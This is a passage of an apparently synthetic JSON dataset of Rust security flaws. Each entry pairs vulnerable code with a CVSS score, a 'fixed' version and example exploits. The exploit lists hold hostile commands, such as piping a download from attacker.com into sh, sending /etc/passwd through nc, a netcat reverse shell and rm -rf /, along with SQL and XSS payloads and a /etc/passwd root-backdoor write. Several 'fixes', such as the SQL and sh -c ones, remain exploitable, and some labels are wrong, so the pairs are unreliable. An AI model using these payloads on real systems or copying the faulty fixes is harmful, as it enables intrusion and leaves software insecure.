            "Supplying a long relative path with many '../' segments might exploit any oversight in path validation logic."
        ]
    },
    "rust_2": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "use std::process::Command;\n\nfn execute_command(user_input: &str) {\n    let output = Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(user_input)\n        .output()\n        .expect(\"Failed to execute command\");\n    println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n}\n\nfn main() {\n    let user_input = \"echo Hello, World!\"; // Simulated user input\n    execute_command(user_input);\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn execute_command(user_input: &str) {\n    if user_input.trim() == \"echo Hello, World!\" {\n        let output = Command::new(\"sh\")\n            .arg(\"-c\")\n            .arg(user_input)\n            .output()\n            .expect(\"Failed to execute command\");\n        println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n    } else {\n        println!(\"Command not allowed\");\n    }\n}\n\nfn main() {\n    let user_input = \"echo Hello, World!\"; // Simulated user input\n    execute_command(user_input);\n}",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files.",
            "Could use 'whoami; sudo su' to gain root access.",
            "Could chain commands like 'ls; cat /etc/shadow' to leak sensitive files."
        ]
    },
    "rust_3": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "use std::process::Command;\n\nstruct UnsafeExecutor {\n    command: String,\n}\n\nimpl UnsafeExecutor {\n    fn new(cmd: &str) -> Self {\n        UnsafeExecutor {\n            command: cmd.to_string(),\n        }\n    }\n\n    fn execute(&self) {\n        Command::new(\"sh\")\n               .arg(&self.command)\n               .output()\n               .expect(\"Failed to execute command\");\n    }\n}\n\nfn main() {\n    let executor = UnsafeExecutor::new(\"echo Hello, world!\");\n    executor.execute();\n}",
        "cvss_score": 8.2,
        "fixed_code": "use std::process::Command;\n\nstruct SafeExecutor {\n    command: String,\n}\n\nimpl SafeExecutor {\n    fn new(cmd: &str) -> Self {\n        SafeExecutor {\n            command: cmd.to_string(),\n        }\n    }\n\n    fn execute(&self) {\n        let parts: Vec<&str> = self.command.split_whitespace().collect();\n        Command::new(parts[0])\n               .args(&parts[1..])\n               .output()\n               .expect(\"Failed to execute command\");\n    }\n}\n\nfn main() {\n    let executor = SafeExecutor::new(\"echo Hello, world!\");\n    executor.execute();\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the system.",
            "Could use 'curl http://attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Chaining commands like 'ls; cat /etc/passwd' can leak sensitive information."
        ]
    },
    "rust_4": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "use std::io;\\n\\nfn main() {\\n    println!(\"Enter your name:\");\\n    let mut input = String::new();\\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\\n    println!(\"Hello, {}!\", input);\\n}",
        "cvss_score": 4.3,
        "fixed_code": "use std::io;\\n\\nfn main() {\\n    println!(\"Enter your name:\");\\n    let mut input = String::new();\\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\\n    let escaped_input = html_escape::encode_text(input.trim());\\n    println!(\"Hello, {}!\", escaped_input);\\n}",
        "exploit_ways": [
            "An attacker could input '<script>alert(1)</script>' to execute a JavaScript alert in the user's browser.",
            "Malicious code like '<img src=x onerror=alert(document.cookie)>' could be used to steal cookies or other sensitive information.",
            "By injecting script tags, an attacker can perform actions on behalf of the victim without their knowledge."
        ]
    },
    "rust_5": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "fn get_user_by_id(id: &str) -> String {\n    let query = format!(\"SELECT * FROM users WHERE id = {}\", id);\n    // Simulate database interaction\n    query\n}",
        "cvss_score": 7.5,
        "fixed_code": "fn get_user_by_id(id: &str) -> String {\n    use std::fmt::Write;\n    let mut query = String::from(\"SELECT * FROM users WHERE id = \");\n    write!(query, \"{}\", id).unwrap(); // Assuming proper parameterization is handled by the DB library\n    // Simulate database interaction with safe parameters\n    query\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user records.",
            "They could inject '; DROP TABLE users --' to delete the users table.",
            "Using '1; SELECT password FROM users WHERE username = 'admin'' could expose admin credentials."
        ]
    },
    "rust_6": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "use std::io::{self, Write};\n\nfn main() {\n    println!(\"Enter command to execute:\");\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    let output = std::process::Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(input.trim())\n        .output()\n        .expect(\"Failed to execute command\");\n    println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n}",
        "cvss_score": 9.0,
        "fixed_code": "use std::io::{self, Write};\n\nfn main() {\n    let allowed_commands = [\"echo\", \"whoami\"];\n    println!(\"Enter command to execute (allowed commands: {:?}):\", allowed_commands);\n    io::stdout().flush().unwrap();\n    let mut input = String::new();\n    io::stdin().read_line(&mut input).expect(\"Failed to read line\");\n    let cmd: Vec<&str> = input.trim().split_whitespace().collect();\n\n    if allowed_commands.contains(&cmd[0]) {\n        let output = std::process::Command::new(cmd[0])\n            .args(&cmd[1..])\n            .output()\n            .expect(\"Failed to execute command\");\n        println!(\"Output: {}\", String::from_utf8_lossy(&output.stdout));\n    } else {\n        println!(\"Command not allowed.\")\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "rust_7": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "fn main() {\n    use std::fs;\n    fs::write(\"/etc/passwd\", \"attacker:x:0:0::/:/bin/bash\\\").expect(\"Failed to write file\");\n}",
        "cvss_score": 7.5,
        "fixed_code": "fn main() {\n    println!(\"This operation requires root privileges and is not allowed.\");\n}",
        "exploit_ways": [
            "An attacker could run the program as a regular user to gain root access by overwriting /etc/passwd.",
            "The vulnerable code can be compiled and executed in environments with improper file permissions, leading to unauthorized privilege escalation.",
            "By modifying the /etc/passwd file, an attacker could add multiple backdoor accounts for future unauthorized access."
        ]
    },
    "rust_8": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "use std::process::Command;\n\nfn execute_user_command(user_input: &str) {\n    let parts: Vec<&str> = user_input.split_whitespace().collect();\n    if !parts.is_empty() {\n        let mut command = Command::new(parts[0]);\n        for arg in &parts[1..] {\n            command.arg(arg);\n        }\n        match command.output() {\n            Ok(output) => println!(\"{}\", String::from_utf8_lossy(&output.stdout)),\n            Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn execute_user_command(user_input: &str) {\n    let allowed_commands = [\"ls\", \"whoami\"];\n    let parts: Vec<&str> = user_input.split_whitespace().collect();\n    if !parts.is_empty() && allowed_commands.contains(&parts[0]) {\n        let mut command = Command::new(parts[0]);\n        for arg in &parts[1..] {\n            command.arg(arg);\n        }\n        match command.output() {\n            Ok(output) => println!(\"{}\", String::from_utf8_lossy(&output.stdout)),\n            Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n        }\n    } else {\n        eprintln!(\"Command not allowed\");\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "rust_9": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn transfer_funds(data: web::Form<TransferData>) -> HttpResponse {\n    // Simulate transferring funds to another user\n    let _ = format!(\"Transferring {} funds to user {}\", data.amount, data.to_user);\n    HttpResponse::Ok().body(\"Funds transferred successfully\")\n}\n\n#[derive(serde::Deserialize)]\nstruct TransferData {\n    amount: String,\n    to_user: String,\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/transfer\", web::post().to(transfer_funds))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer, cookie::Cookie};\nuse rand::Rng;\n\nasync fn transfer_funds(data: web::Form<TransferData>, cookies: web::CookieJar) -> HttpResponse {\n    let csrf_token = if let Some(cookie) = cookies.get(\"csrf-token\") {\n        cookie.value().to_string()\n    } else {\n        return HttpResponse::Unauthorized().body(\"CSRF token missing\");\n    };\n\n    if data.csrf_token != csrf_token {\n        return HttpResponse::Forbidden().body(\"Invalid CSRF token\");\n    }\n\n    // Simulate transferring funds to another user\n    let _ = format!(\"Transferring {} funds to user {}\", data.amount, data.to_user);\n    HttpResponse::Ok().body(\"Funds transferred successfully\")\n}\n\n#[derive(serde::Deserialize)]\nstruct TransferData {\n    amount: String,\n    to_user: String,\n    csrf_token: String,\n}\n\nasync fn generate_csrf_token() -> String {\n    let mut rng = rand::thread_rng();\n    (0..32)\n        .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)\n        .collect()\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        let csrf_token = generate_csrf_token();\n        App::new()\n            .wrap_fn(move |req, srv| {\n                let mut response = srv.call(req).await.unwrap();\n                if let Some(cookie) = Cookie::build(\"csrf-token\", &csrf_token)\n                    .path(\"/\")\n                    .secure(true)\n                    .http_only(true)\n                    .finish()\n                {\n                    response.add_cookie(&cookie);\n                }\n                Ok(response)\n            })\n            .route(\"/transfer\", web::post().to(transfer_funds))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, automatically submits a request to transfer funds.",
            "By tricking the user into clicking on a specially crafted URL or image embedded in an email or forum post, the attacker can perform actions without the user's explicit consent.",
            "The attacker could use a CSRF token prediction or brute force attack if the tokens are predictable or weakly generated."
        ]
    },
    "rust_10": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "use std::process::Command;\n\nfn execute_command(cmd: &str) -> String {\n    let output = Command::new(\"sh\")\n        .arg(&[\"-c\", cmd].concat())\n        .output()\n        .expect(\"failed to execute process\");\n    String::from_utf8_lossy(&output.stdout).to_string()\n}\n\nfn main() {\n    let user_input = std::env::args().nth(1).unwrap_or(String::new());\n    println!(\"Command output:\\n{}\", execute_command(&user_input));\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn execute_command(cmd: &str) -> String {\n    let output = Command::new(\"sh\")\n        .arg(&[\"-c\", \"echo \", cmd].concat())\n        .output()\n        .expect(\"failed to execute process\");\n    String::from_utf8_lossy(&output.stdout).to_string()\n}\n\nfn main() {\n    let user_input = std::env::args().nth(1).unwrap_or(String::new());\n    println!(\"Command output:\\n{}\", execute_command(&user_input));\n}",
        "exploit_ways": [
            "User could input '; rm -rf /' to delete all files on the system.",
            "Could use '; curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like '; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "rust_11": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "use actix_web::{web, App, HttpResponse, HttpServer};\n\nasync fn change_email(data: web::Form<ChangeEmailData>) -> HttpResponse {\n    // Simulate changing the user's email address without CSRF protection\n    format!(\"Email changed to: {}\", data.email)\n}\n\n#[derive(serde::Deserialize)]\nstruct ChangeEmailData {\n    email: String,\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .route(\"/change-email\", web::post().to(change_email))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "cvss_score": 6.5,
        "fixed_code": "use actix_web::{web, App, HttpResponse, HttpServer};\nuse actix_session::Session;\nuse rand::Rng;\nuse serde::Deserialize;\n\nasync fn change_email(data: web::Form<ChangeEmailData>, session: Session) -> HttpResponse {\n    let csrf_token = session.get::<String>(\"csrf_token\").unwrap_or_default();\n    if data.csrf_token != csrf_token {\n        return HttpResponse::Unauthorized().body(\"Invalid CSRF token\")\n    }\n    // Simulate changing the user's email address with CSRF protection\n    format!(\"Email changed to: {}\", data.email)\n}\n\n#[derive(Deserialize)]\nstruct ChangeEmailData {\n    email: String,\n    csrf_token: String,\n}\n\nasync fn index(session: Session) -> HttpResponse {\n    let mut rng = rand::thread_rng();\n    let csrf_token: String = (0..32).map(|_| rng.sample(rand::distributions::Alphanumeric)).map(char::from).collect();\n    session.set(\"csrf_token\", &csrf_token);\n    format!(\"<form action=\"/change-email\" method=\"POST\">\n              <input type=\"hidden\" name=\"csrf_token\" value={}>\n              <input type=\"email\" name=\"email\">\n              <button type=\"submit\">Change Email</button>\n            </form>\", csrf_token)\n}\n\n#[actix_web::main]\nasync fn main() -> std::io::Result<()> {\n    HttpServer::new(|| {\n        App::new()\n            .wrap(actix_session::CookieSession::signed(&[0; 32]).secure(false))\n            .route(\"/\", web::get().to(index))\n            .route(\"/change-email\", web::post().to(change_email))\n    })\n    .bind(\"127.0.0.1:8080\")?\n    .run()\n    .await\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link to change their email address without their knowledge.",
            "By sending a crafted form submission from another domain, an attacker could change the victim's email address if not protected by CSRF tokens.",
            "Using social engineering tactics, an attacker could deceive the user into submitting a form that changes their account details in the background."
        ]
    },
    "rust_12": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "fn login(username: &str, password: &str) -> bool {\n    username == \"admin\" && password == \"password123\"\n}",
        "cvss_score": 6.5,
        "fixed_code": "use argon2::Config;\n\nfn verify_password(hash: &str, password: &str) -> bool {\n    let config = Config::default();\n    argon2::verify_encoded(hash, password.as_bytes()).unwrap_or(false)\n}\n\nfn login(username: &str, password: &str) -> bool {\n    let stored_hash = \"$argon2i$v=19$m=4096,t=3,p=1$Qw==\"; // Example hash placeholder\n    username == \"admin\" && verify_password(stored_hash, password)\n}",
        "exploit_ways": [
            "An attacker can use the hardcoded credentials 'admin' and 'password123' to gain unauthorized access.",
            "By knowing or guessing the default admin username, an attacker can attempt brute force attacks on the password.",
            "If the application does not have proper logging, attackers may exploit this vulnerability without detection."
        ]
    },
    "rust_13": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "use std::fs::File;\nuse std::io::{self, Read};\n\nfn read_file(path: &str) -> io::Result<String> {\n    let mut file = File::open(path)?;\n    let mut contents = String::new();\n    file.read_to_string(&mut contents)?;\n    Ok(contents)\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::fs::File;\nuse std::io::{self, Read};\nuse std::path::{Path, PathBuf};\n\nfn read_file(base_path: &str, path: &str) -> io::Result<String> {\n    let base = Path::new(base_path);\n    let absolute_path = base.join(path).canonicalize()?;\n    if !absolute_path.starts_with(base) {\n        return Err(io::Error::new(io::ErrorKind::InvalidInput, \"Path traversal attempt detected\"));\n    }\n    let mut file = File::open(&absolute_path)?;\n    let mut contents = String::new();\n    file.read_to_string(&mut contents)?;\n    Ok(contents)\n}",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "Using '../../secret/file.txt' could expose sensitive internal files.",
            "Crafting a path like '../../../home/user/.ssh/id_rsa' might allow access to private SSH keys."
        ]
    },
    "rust_14": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "use std::process::Command;\n\nstruct UnsafeExecutor {\n    command: String,\n}\n\nimpl UnsafeExecutor {\n    fn new(cmd: &str) -> Self {\n        UnsafeExecutor { command: cmd.to_string() }\n    }\n\n    fn execute(&self) {\n        let parts: Vec<&str> = self.command.split_whitespace().collect();\n        let mut child = Command::new(parts[0])\n            .args(&parts[1..])\n            .spawn()\n            .expect(\"Failed to execute command\");\n\n        let _output = child.wait_with_output().expect(\"Failed to wait on child\");\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "use std::process::Command;\n\nstruct SafeExecutor {\n    program: String,\n    args: Vec<String>,\n}\n\nimpl SafeExecutor {\n    fn new(program: &str, args: &[&str]) -> Self {\n        SafeExecutor { \n            program: program.to_string(),\n            args: args.iter().map(|&s| s.to_string()).collect(),\n        }\n    }\n\n    fn execute(&self) {\n        let mut child = Command::new(&self.program)\n            .args(&self.args)\n            .spawn()\n            .expect(\"Failed to execute command\");\n\n        let _output = child.wait_with_output().expect(\"Failed to wait on child\");\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'ls; rm -rf /' to list files and then delete all files.",
            "Could use 'echo malicious_code > malware.sh; chmod +x malware.sh; ./malware.sh' to create and execute a malicious script.",
            "A chained command like 'cat /etc/passwd | nc attacker.com 1234' could send system information to an external server."
        ]
    },
    "rust_15": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "pub struct SafeString {\n    buffer: [u8; 16],\n}\n\nimpl SafeString {\n    pub fn new() -> Self {\n        SafeString { buffer: [0; 16] }\n    }\n\n    pub unsafe fn set(&mut self, data: &[u8]) {\n        std::ptr::copy_nonoverlapping(data.as_ptr(), self.buffer.as_mut_ptr(), data.len());\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "pub struct SafeString {\n    buffer: [u8; 16],\n}\n\nimpl SafeString {\n    pub fn new() -> Self {\n        SafeString { buffer: [0; 16] }\n    }\n\n    pub fn set(&mut self, data: &[u8]) {\n        if data.len() > self.buffer.len() {\n            panic!(\"Data too long\");\n        }\n        self.buffer[..data.len()].copy_from_slice(data);\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a data slice longer than 16 bytes to overwrite adjacent memory.",
            "By overwriting the return address, an attacker could redirect execution to arbitrary code.",
            "Overwriting critical data structures in memory could lead to unpredictable behavior or crashes."
        ]
    },
    "rust_17": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "use serde_json;\n\nfn main() {\n    let json_data = String::from(\"{\\\"typ\\\":\\\"PicklePayload\\\", \\\"value\\\":\\\"O:std::fs::File:\\x0a:\\x00:\\x13inner\\nRtJNSA5OS4xLjAuMC9mcy9GaWxlU3RyZWFtOmo6cHJpdmF0ZV9maWxlc3RyZWFtX2lubmVyOjo6cGk6cmlnaHRzX3Jvb3Q6OkJ1aWx0aW5nUHJvamVjdDogTGl0RmlsZXN0cmVhbToxLjAuMC9saXRfZmlsZXN0cmVhbTpGaWxlU3RyZWFtOjIuNi4wL2ZpbGVzdHJlYW06SGFuZGxlOlJhbi9mcy9MaXRFbnRyaW5lOjEwLjAuMC9naXRsOjAuaGlkZV9zcmMvZmlsZXN0cmVhbTovc291cmNlczogQWJzdHJhY3RDb250ZW50cy9maWxlc3RyZWFtL1BhdGg6NS44LjAvaGlkZV9zcmMvZmlsZXN0cmVhbTovcGF0aDogcGF0aDozLjAuMC9mb2xsb3c6cHJpdmF0ZV9mYWN0b3J5OjpibG9ja19pdGVyYXRvcjo6dW5kcmVmIG86MTAuMTAuMC9oaWRlX3NyYy9maWxlc3RyZWFtOi9wYXRoOiBydW5fbWFuYWduZWQ6cHJpdmF0ZV9mYWN0b3J5OjpibG9ja19pdGVyYXRvcjo6dW5kcmVmIHRwOiJmcy9GaWxlU3RyZWFtOjEwLjAuMC9maWxlc3RyZWFtOiRob2RuZGxlOlJhbi9mcy9MaXRFbnRyaW5lOjEwLjAuMC9naXRsOjAuaGlkZV9zcmMvZmlsZXN0cmVhbTovc291cmNlczogQWJzdHJhY3RDb250ZW50cy9maWxlc3RyZWFtL1BhdGg6NS44LjAvaGlkZV9zcmMvZmlsZXN0cmVhbTovcGF0aDogcGF0aDozLjAuMC9mb2xsb3c6cHJpdmF0ZV9mYWN0b3J5OjpibG9ja19pdGVyYXRvcjo6dW5kcmVmIHRwOiJmbzogL3RtcC9xdWlja19hZ2VudCI=\\\"}\");\n    let deserialized: serde_json::Value = serde_json::from_str(&json_data).unwrap();\n    println!(\"Deserialized: {:?}\", deserialized);\n}",
        "cvss_score": 7.5,
        "fixed_code": "use serde_json;\n\nfn main() {\n    let json_data = String::from(\"{\\\"typ\\\":\\\"SafePayload\\\", \\\"value\\\":\\\"safe_value\\\"}\");\n    if let Ok(deserialized) = serde_json::from_str::<serde_json::Value>(&json_data) {\n        if deserialized.get(\\\"typ\\\").and_then(|v| v.as_str()) == Some(\\\"SafePayload\\\") {\n            println!(\\\"Deserialized: {:?}\\\", deserialized);\n        } else {\n            println!(\\\"Invalid payload type\\\");\n        }\n    } else {\n        println!(\\\"Failed to deserialize JSON\\\");\n    }\n}",
        "exploit_ways": [
            "Attacker could craft a malicious payload that, when deserialized, executes arbitrary code.",
            "By manipulating the 'value' field with a specially crafted serialized object, an attacker might be able to exploit vulnerabilities in the target system.",
            "If the application trusts and processes all incoming JSON data without proper validation, it can lead to remote code execution or other critical security issues."
        ]
    },
    "rust_18": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "use bincode::{deserialize, serialized_size};\nfn deserialize_data(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {\n    let _deserialized: MyStruct = deserialize(data)?;\n    Ok(())\n}\npub struct MyStruct {\n    pub value: String,\n}",
        "cvss_score": 7.5,
        "fixed_code": "use bincode::{deserialize, serialized_size};\nuse serde::de::DeserializeOwned;\nfn deserialize_data<T: DeserializeOwned>(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {\n    let _deserialized: T = deserialize(data)?;\n    Ok(())\n}\npub struct MyStruct {\n    pub value: String,\n}",
        "exploit_ways": [
            "An attacker could send specially crafted serialized data to execute arbitrary code on the server.",
            "The vulnerability can be used to perform privilege escalation by deserializing a malicious payload that grants administrative access.",
            "By injecting serialized objects, an attacker might be able to overwrite or corrupt critical application state."
        ]
    },
    "rust_19": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "use std::process::Command;\n\nfn main() {\n    let user_input = String::from(\"sudo rm -rf /\");\n    Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(user_input)\n        .output()\n        .expect(\"Failed to execute command\");\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::process::Command;\n\nfn main() {\n    let safe_command = \"echo \\\"Safe command\\\"\";\n    Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(safe_command)\n        .output()\n        .expect(\"Failed to execute command\");\n}",
        "exploit_ways": [
            "An attacker could input 'sudo rm -rf /' to delete all files on the system.",
            "Could provide a reverse shell command like 'nc attacker.com 1234 -e /bin/sh' for remote access.",
            "Could use 'sudo passwd' followed by a new password to gain root access."
        ]
    },
    "rust_20": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "use serde_json;\n\nfn deserialize_data(data: &str) -> Result<(), Box<dyn std::error::Error>> {\n    let deserialized: serde_json::Value = serde_json::from_str(data)?;\n    Ok(())\n}",
        "cvss_score": 7.5,
        "fixed_code": "use serde_json;\n\nfn deserialize_data<T: serde::de::DeserializeOwned>(data: &str) -> Result<T, Box<dyn std::error::Error>> {\n    let deserialized: T = serde_json::from_str(data)?;\n    Ok(deserialized)\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON that exploits vulnerabilities in the application's handling of deserialized data.",
            "They could use crafted JSON to manipulate application logic, leading to unauthorized actions or data leaks.",
            "By sending specifically crafted JSON payloads, an attacker might be able to exploit type confusion issues, resulting in code execution."
        ]
    },
    "rust_21": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "fn vulnerable_query(user_input: &str) -> String {\n    format!(\"SELECT * FROM users WHERE name = '{}'\", user_input)\n}",
        "cvss_score": 7.5,
        "fixed_code": "use sqlx::prelude::*;\nuse sqlx::SqlitePool;\n\nasync fn safe_query(pool: &SqlitePool, user_input: &str) -> Result<String, sqlx::Error> {\n    let query = \"SELECT * FROM users WHERE name = ?\";\n    let row = sqlx::query(query)\n        .bind(user_input)\n        .fetch_one(pool).await?\n        .get::<String, _>(0);\n    Ok(row)\n}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to retrieve all users.",
            "They can use a payload like \"admin'; DROP TABLE users; -- \" to drop the users table.",
            "Input such as \"admin'; SELECT * FROM secret_data; -- \" can be used to extract data from other tables."
        ]
    },
    "rust_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "use std::process::Command;\n\nstruct Executor {\n    command: String,\n}\n\nimpl Executor {\n    fn new(command: String) -> Executor {\n        Executor { command }\n    }\n\n    fn run(&self) {\n        let parts: Vec<&str> = self.command.split_whitespace().collect();\n        if let Some(&program) = parts.first() {\n            let mut cmd = Command::new(program);\n            for arg in &parts[1..] {\n                cmd.arg(arg);\n            }\n            match cmd.output() {\n                Ok(_) => println!(\"Command executed successfully.\"),\n                Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n            }\n        }\n    }\n}\n\nfn main() {\n    let user_input = String::from(\"echo hello; rm -rf /\"); // Simulated user input\n    let executor = Executor::new(user_input);\n    executor.run();\n}",
        "cvss_score": 8.5,
        "fixed_code": "use std::process::Command;\n\nstruct Executor {\n    program: String,\n    args: Vec<String>,\n}\n\nimpl Executor {\n    fn new(program: String, args: Vec<String>) -> Executor {\n        Executor { program, args }\n    }\n\n    fn run(&self) {\n        let mut cmd = Command::new(&self.program);\n        for arg in &self.args {\n            cmd.arg(arg);\n        }\n        match cmd.output() {\n            Ok(_) => println!(\"Command executed successfully.\"),\n            Err(e) => eprintln!(\"Failed to execute command: {}\", e),\n        }\n    }\n}\n\nfn main() {\n    let user_input = String::from(\"echo\"); // Simulated program input\n    let args = vec![String::from(\"hello\")]; // Simulated arguments input\n    let executor = Executor::new(user_input, args);\n    executor.run();\n}",
        "exploit_ways": [
            "User could input 'rm' as the program and '-rf /' as an argument to delete system files.",
            "Could use 'curl attacker.com/malware.sh' as a program and '| sh' as an argument to execute remote malicious code.",
            "Could chain commands by providing multiple arguments to achieve arbitrary command execution."
        ]
    },
    "rust_23": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "use std::collections::HashMap;\n\nstruct User {\n    username: String,\n    password_hash: u64,\n}\n\nfn hash_password(password: &str) -> u64 {\n    let mut hash = 0;\n    for byte in password.bytes() {\n        hash ^= (hash << 5) + ((hash >> 27) ^ byte as u64);\n    }\n    hash\n}\n\nfn main() {\n    let mut users: HashMap<String, User> = HashMap::new();\n    users.insert(\n        \"admin\".to_string(),\n        User {\n            username: \"admin\".to_string(),\n            password_hash: hash_password(\"securepassword123\"),\n        },\n    );\n\n    let input_username = \"admin\";\n    let input_password = \"securepassword123\";\n    if let Some(user) = users.get(input_username) {\n        if user.password_hash == hash_password(input_password) {\n            println!(\"Login successful!\");\n        } else {\n            println!(\"Invalid password.\");\n        }\n    } else {\n        println!(\"User not found.\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "use std::collections::HashMap;\nuse argon2::{Argon2, Config};\n\nstruct User {\n    username: String,\n    password_hash: Vec<u8>,\n}\n\nfn hash_password(password: &str) -> Vec<u8> {\n    let config = Config::default();\n    let salt = b\"somesalt\";\n    let mut hash = vec![0; 32];\n    Argon2::default().hash_password_into(password.as_bytes(), salt, &config, &mut hash).unwrap();\n    hash\n}\n\nfn verify_password(hash: &[u8], password: &str) -> bool {\n    let config = Config::default();\n    let salt = b\"somesalt\";\n    Argon2::default().verify_password(password.as_bytes(), &config, hash).is_ok()\n}\n\nfn main() {\n    let mut users: HashMap<String, User> = HashMap::new();\n    users.insert(\n        \"admin\".to_string(),\n        User {\n            username: \"admin\".to_string(),\n            password_hash: hash_password(\"securepassword123\"),\n        },\n    );\n\n    let input_username = \"admin\";\n    let input_password = \"securepassword123\";\n    if let Some(user) = users.get(input_username) {\n        if verify_password(&user.password_hash, input_password) {\n            println!(\"Login successful!\");\n        } else {\n            println!(\"Invalid password.\");\n        }\n    } else {\n        println!(\"User not found.\");\n    }\n}",
        "exploit_ways": [
            "An attacker could brute-force the hash due to the weak and non-salted hashing algorithm.",
            "If the attacker gains access to the user database, they can try common passwords since the hash is unsalted and simple.",
            "Potential for rainbow table attacks if attackers use precomputed tables of hashes for the simple algorithm."
        ]
    },
    "rust_24": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "use std::collections::HashMap;\n\nstruct UserAuth {\n    users: HashMap<String, String>,\n}\n\nimpl UserAuth {\n    fn new() -> Self {\n        let mut auth = UserAuth { users: HashMap::new() };\n        auth.users.insert(\"admin\".to_string(), \"securepassword123\".to_string());\n        auth\n    }\n\n    fn login(&self, username: &str, password: &str) -> bool {\n        self.users.get(username).map_or(false, |pwd| pwd == password)\n    }\n}\n\nfn main() {\n    let auth = UserAuth::new();\n    let user_input_username = \"admin\";\n    let user_input_password = std::env::var(\"PASSWORD\").unwrap_or_default();\n    if auth.login(user_input_username, &user_input_password) {\n        println!(\"Access granted!\");\n    } else {\n        println!(\"Access denied.\");\n    }\n}",
        "cvss_score": 7.5,
